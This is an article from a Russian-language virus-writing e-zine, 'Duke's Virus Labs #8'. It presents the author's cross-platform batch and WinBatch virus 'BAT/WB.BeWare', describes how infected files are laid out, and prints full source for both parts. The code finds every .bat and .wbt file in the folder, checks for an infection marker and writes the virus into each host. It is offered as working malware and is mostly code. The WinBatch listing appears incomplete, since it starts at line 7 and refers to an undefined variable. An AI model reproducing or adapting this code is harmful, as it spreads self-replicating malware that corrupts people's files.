- [Duke's Virus Labs #8] - [Page 20] -

BAT/WB.BeWare aka SMF.BeWare
(c) by Duke/SMF

Имя вируса    : BAT/WB.Simple aka SMF.BeWare
Автор         : Duke/SMF
Язык прогр.   : Windows Interface Language (WinBatch) + DOS Batch Script
Платформа     : DOS/Windows/WinBatch application
Дата создания : 28.07.99

   Первый в мире BAT/WB кросплатформенный вирус, способный поражать BAT и WBT
файлы и, таким образом, живущий под DOS/Win32 - настоящий скриптовый
многоплатформенный вирус. Написан на 2-х языках программирования.
   Для заражения WBT-файлов используется метод вируса WB.Simple из предыдущей
статьи. WBT-часть вируса носит в своем теле в виде массива BAT-часть вируса
и при заражении BAT-файлов записывает ее в начало жертвы. Пораженный BAT-файл
имеет структуру:
           <BAT-тело вируса>
           <полный WB-вирус>
           :RunBeWare
           <пораженный BAT-файл>
           @goto Comon
           :End

   BAT-часть вируса выглядит следующим образом :
=== Cut ===
@REM BeWare
@goto RunBeWare
:Comon %BeWare%
@ctty nul%BeWare%
if ^%1==^BeWareBAT goto BeWareBAT
if ^%1==^BeWareWBT goto BeWareWBT
for %%b in (*.bat) do call %0 BeWareBAT %%b
for %%w in (*.wbt) do call %0 BeWareWBT %%w
del $BeWare$
goto End%BeWare%
:BeWareBAT
find "BeWare"<%2
if not errorlevel 1 goto End%BeWare%
copy %2 $BeWare$
echo.>>$BeWare$
echo @goto Comon>>$BeWare$
echo :End>>$BeWare$
find "BeWare"<%0>%2
type $BeWare$>>%2
goto End%BeWare%
:BeWareWBT
find "BeWare"<%2
if not errorlevel 1 goto End%BeWare%
copy %2 $BeWare$
find "BeWare%BeWare%!"<%0>%2
type $BeWare$>>%2
goto End%BeWare%
:RunBeWare
@goto Comon
:End
=== Cut ===

   А это полное тело вируса в виде WBT-файла :

===== Cut here =====
;BAT/WB.BeWare!
BATBody7 = "for %%%%b in (*.bat) do call %%0 BeWareBAT %%%%b" ;BeWare!
BATBody8 = "for %%%%w in (*.wbt) do call %%0 BeWareWBT %%%%w" ;BeWare!
BATBody9 = "del $BeWare$" ;BeWare!
BATBody10 = "goto End%%BeWare%%" ;BeWare!
BATBody11 = ":BeWareBAT" ;BeWare!
BATBody12 = "find ""BeWare""<%%2" ;BeWare!
BATBody13 = "if not errorlevel 1 goto End%%BeWare%%" ;BeWare!
BATBody14 = "copy %%2 $BeWare$" ;BeWare!
BATBody15 = "echo.>>$BeWare$" ;BeWare!
BATBody16 = "echo @goto Comon>>$BeWare$" ;BeWare!
BATBody17 = "echo :End>>$BeWare$" ;BeWare!
BATBody18 = "find ""BeWare""<%%0>%%2" ;BeWare!
BATBody19 = "type $BeWare$>>%%2" ;BeWare!
BATBody20 = "goto End%%BeWare%%" ;BeWare!
BATBody21 = ":BeWareWBT" ;BeWare!
BATBody22 = "find ""BeWare""<%%2" ;BeWare!
BATBody23 = "if not errorlevel 1 goto End%%BeWare%%" ;BeWare!
BATBody24 = "copy %%2 $BeWare$" ;BeWare!
BATBody25 = "find ""BeWare%%BeWare%%!""<%%0>%%2" ;BeWare!
BATBody26 = "type $BeWare$>>%%2" ;BeWare!
BATBody27 = "goto End%%BeWare%%" ;BeWare!
BATBody28 = ":RunBeWare" ;BeWare!
BATBody29 = "@goto Comon" ;BeWare!
BATBody30 = ":End" ;BeWare!
AllBAT = FileItemize("*.bat") ;BeWare!
For w = 1 To ItemCount(AllBAT, @tab) ;BeWare!
   OneBAT = ItemExtract(w, AllBAT, @tab) ;BeWare!
   Size=FileSize(OneBAT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneBAT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 11) == "@REM BeWare" then Goto InfBAT ;BeWare!
   FileCopy(OneBAT,"C:\BeWare!",0)
   host = FileOpen(OneBAT, "WRITE") ;BeWare!
   For j = 1 to 27 ;BeWare!
      FileWrite(host, BATBody%j%) ;BeWare!
   Next j ;BeWare!
   virus = FileOpen(Viral, "READ") ;BeWare!
   While @TRUE ;BeWare!
      x = FileRead(virus) ;BeWare!
      FileWrite(host, x) ;BeWare!
      If x == "EXIT ;BeWare!" Then Break
   EndWhile ;BeWare!
   FileWrite(host,BATBody28) ;BeWare!
   FileClose(virus) ;BeWare!
   FileClose(host) ;BeWare!
   Size=FileSize("C:\BeWare!")
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, "C:\BeWare!") ;BeWare!
   BinaryWriteEx(MarkBuffer, 0, OneBAT, 4827, Size) ;BeWare!
   temp = FileOpen("C:\BeWare!", "READ")
   FileDelete(temp) ;BeWare!
   host = FileOpen(OneBAT, "APPEND") ;BeWare!
   FileWrite(host,BATBody29) ;BeWare!
   FileWrite(host,BATBody30) ;BeWare!
   FileClose(host) ;BeWare!
:InfBAT ;BeWare!
Next w ;BeWare!
EXIT ;BeWare!
===== Cut here =====
